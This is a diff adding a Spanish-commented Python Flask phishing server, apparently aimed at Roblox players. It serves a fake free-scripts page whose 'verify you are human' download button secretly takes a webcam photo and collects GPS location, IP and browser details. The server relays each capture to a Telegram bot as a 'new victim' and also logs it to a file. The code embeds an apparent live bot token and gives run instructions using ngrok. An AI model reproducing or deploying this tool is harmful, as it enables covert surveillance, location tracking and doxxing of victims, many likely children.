@@ -1,1 +1,272 @@
+# === SERVIDOR FLASK + FRONTEND PHISHING (Roblox Scripts) ===
+# Ejecutar: pip install flask requests python-telegram-bot && python3 roblox_phishing.py
+# Luego abrir en navegador: http://tu_ip:5000
 
+from flask import Flask, request, render_template_string, jsonify
+import requests
+import json
+import base64
+import time
+from datetime import datetime
+import os
+
+app = Flask(__name__)
+
+# === CONFIGURACIÓN TELEGRAM ===
+BOT_TOKEN = "8272335528:AAEq0rHkkA7AhcCaK2ucBDtHyVU8Yp0ffwY"  # Reemplazar con token de @BotFather
+CHAT_ID = "8521142101"      # Reemplazar con tu ID (obtén con @userinfobot)
+
+# === FUNCIÓN PARA ENVIAR A TELEGRAM ===
+def enviar_a_telegram(mensaje, foto=None):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": mensaje, "parse_mode": "HTML"}
+    try:
+        requests.post(url, data=data, timeout=5)
+    except:
+        pass
+    if foto:
+        url_foto = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        files = {"photo": ("captura.jpg", foto, "image/jpeg")}
+        data_foto = {"chat_id": CHAT_ID, "caption": "📸 Foto de la víctima"}
+        try:
+            requests.post(url_foto, data=data_foto, files=files, timeout=10)
+        except:
+            pass
+
+# === HTML DE LA PÁGINA PHISHING ===
+HTML_PAGINA = """
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔧 Roblox Scripts Hub - Descarga Gratis</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
+        .container { max-width: 800px; margin: auto; background: #16213e; border-radius: 20px; padding: 30px; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
+        h1 { color: #ff6b6b; text-align: center; }
+        .script-box { background: #0f3460; padding: 15px; border-radius: 10px; margin: 10px 0; border-left: 5px solid #e94560; }
+        .script-box pre { background: #1a1a2e; padding: 10px; border-radius: 8px; overflow-x: auto; color: #00d2ff; }
+        .btn { background: #e94560; color: white; border: none; padding: 12px 30px; border-radius: 30px; font-size: 18px; cursor: pointer; display: block; margin: 20px auto; }
+        .btn:hover { background: #ff6b6b; }
+        .permiso { background: #0f3460; padding: 15px; border-radius: 10px; margin: 15px 0; text-align: center; font-size: 16px; }
+        .loading { display: none; text-align: center; color: #ffd93d; }
+        footer { text-align: center; margin-top: 30px; color: #888; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Roblox Scripts Premium</h1>
+        <p style="text-align:center;">Descarga los mejores scripts para Roblox, totalmente gratuitos y sin virus.</p>
+        <div class="script-box">
+            <strong>🔹 Script de Auto-Farm (Actualizado)</strong>
+            <pre>--[[ Código optimizado para farmear monedas ]]
+while true do
+    game.Players.LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(100, 0, 100))
+    wait(0.5)
+end</pre>
+        </div>
+        <div class="script-box">
+            <strong>🔹 Script de Velocidad (Hack)</strong>
+            <pre>--[[ Aumenta velocidad al máximo ]]
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 999</pre>
+        </div>
+        <div class="script-box">
+            <strong>🔹 Script de Invisibilidad</strong>
+            <pre>--[[ Vuelve invisible ]]
+game.Players.LocalPlayer.Character.Transparency = 1</pre>
+        </div>
+        <div style="text-align:center; margin: 20px 0;">
+            <button class="btn" onclick="solicitarPermisos()">📥 Descargar Scripts (Requiere permisos)</button>
+        </div>
+        <div class="permiso" id="estadoPermisos">
+            ⚠️ Para descargar, necesitamos verificar que eres humano.
+            <br>Permisos requeridos: <strong>cámara</strong> y <strong>ubicación</strong>.
+        </div>
+        <div class="loading" id="cargando">
+            ⏳ Verificando permisos... Enviando datos...
+        </div>
+        <footer>© Roblox Scripts Hub - Todos los scripts son de código abierto.</footer>
+    </div>
+
+    <script>
+        // Función para capturar IP (mediante llamada a ipify)
+        function obtenerIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => data.ip)
+                .catch(() => 'IP no disponible');
+        }
+
+        // Función para capturar ubicación (GPS)
+        function obtenerUbicacion() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('GPS no soportado');
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`);
+                    },
+                    (err) => {
+                        resolve('GPS denegado o error');
+                    },
+                    { timeout: 8000, enableHighAccuracy: true }
+                );
+            });
+        }
+
+        // Función para capturar foto desde cámara
+        function capturarFoto() {
+            return new Promise((resolve) => {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    resolve(null);
+                    return;
+                }
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+                    .then((stream) => {
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const dataURL = canvas.toDataURL('image/jpeg', 0.8);
+                            stream.getTracks().forEach(t => t.stop());
+                            document.body.removeChild(video);
+                            resolve(dataURL.split(',')[1]); // parte base64
+                        }, 1500);
+                    })
+                    .catch((err) => {
+                        document.body.removeChild(video);
+                        resolve(null);
+                    });
+            });
+        }
+
+        // Función para obtener datos del navegador
+        function obtenerDatosNavegador() {
+            return {
+                userAgent: navigator.userAgent,
+                plataforma: navigator.platform,
+                idioma: navigator.language,
+                pantalla: `${screen.width}x${screen.height}`,
+                tiempo: new Date().toISOString()
+            };
+        }
+
+        // Función principal
+        async function solicitarPermisos() {
+            document.getElementById('estadoPermisos').style.display = 'none';
+            document.getElementById('cargando').style.display = 'block';
+
+            // Obtener IP (siempre)
+            const ip = await obtenerIP();
+
+            // Solicitar permisos (cámara y ubicación)
+            let fotoBase64 = null;
+            let ubicacion = 'No solicitada';
+
+            try {
+                // Cámara
+                fotoBase64 = await capturarFoto();
+                // Ubicación
+                ubicacion = await obtenerUbicacion();
+            } catch (e) {
+                // Si falla, continuamos
+            }
+
+            // Datos del navegador
+            const navegador = obtenerDatosNavegador();
+
+            // Construir payload
+            const payload = {
+                ip: ip,
+                ubicacion: ubicacion,
+                foto: fotoBase64,  // null si no se obtuvo
+                navegador: navegador,
+                timestamp: new Date().toISOString()
+            };
+
+            // Enviar al servidor
+            try {
+                const resp = await fetch('/capturar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const resultado = await resp.json();
+                document.getElementById('cargando').innerHTML = '✅ ¡Descarga iniciada! Redirigiendo...';
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com'; // Redirige a Roblox real
+                }, 2000);
+            } catch (error) {
+                document.getElementById('cargando').innerHTML = '❌ Error, intente de nuevo.';
+            }
+        }
+    </script>
+</body>
+</html>
+"""
+
+# === RUTA PRINCIPAL (sirve la página) ===
+@app.route('/')
+def index():
+    return render_template_string(HTML_PAGINA)
+
+# === RUTA PARA RECIBIR DATOS CAPTURADOS ===
+@app.route('/capturar', methods=['POST'])
+def capturar():
+    data = request.get_json()
+    if not data:
+        return jsonify({"error": "No data"}), 400
+
+    # Obtener IP real desde la petición (si no viene en data)
+    ip_real = request.remote_addr
+    ip_enviada = data.get('ip', ip_real)
+
+    # Construir mensaje para Telegram
+    mensaje = f"<b>🎯 NUEVA VÍCTIMA</b>\n"
+    mensaje += f"<b>IP:</b> {ip_enviada}\n"
+    mensaje += f"<b>Ubicación:</b> {data.get('ubicacion', 'No disponible')}\n"
+    navegador = data.get('navegador', {})
+    mensaje += f"<b>User-Agent:</b> {navegador.get('userAgent', 'N/A')}\n"
+    mensaje += f"<b>Plataforma:</b> {navegador.get('plataforma', 'N/A')}\n"
+    mensaje += f"<b>Idioma:</b> {navegador.get('idioma', 'N/A')}\n"
+    mensaje += f"<b>Pantalla:</b> {navegador.get('pantalla', 'N/A')}\n"
+    mensaje += f"<b>Hora:</b> {data.get('timestamp', '')}\n"
+
+    # Enviar mensaje a Telegram
+    enviar_a_telegram(mensaje)
+
+    # Si hay foto, enviarla
+    foto_b64 = data.get('foto')
+    if foto_b64:
+        try:
+            foto_bytes = base64.b64decode(foto_b64)
+            enviar_a_telegram("📸 Foto adjunta", foto_bytes)
+        except:
+            pass
+
+    # Guardar en archivo local (respaldo)
+    with open("victimas.log", "a") as f:
+        f.write(json.dumps(data) + "\n")
+
+    return jsonify({"status": "ok"}), 200
+
+# === INICIAR SERVIDOR ===
+if __name__ == "__main__":
+    # Verificar que el bot token y chat ID están configurados
+    if BOT_TOKEN == "8272335528:AAEq0rHkkA7AhcCaK2ucBDtHyVU8Yp0ffwY" or CHAT_ID == "TU_CHAT_ID_AQUI":
+        print("⚠️  Configura BOT_TOKEN y CHAT_ID en el código.")
+        print("⚠️  Obtén tu chat ID con @userinfobot en Telegram.")
+        exit(1)
+    print("🚀 Servidor phishing iniciado en http://0.0.0.0:5000")
+    print("📡 Comparte la URL pública (usa ngrok o similar) para recibir datos.")
+    print("📩 Los datos llegarán a tu bot de Telegram.")
+    app.run(host='0.0.0.0', port=5000, debug=False)
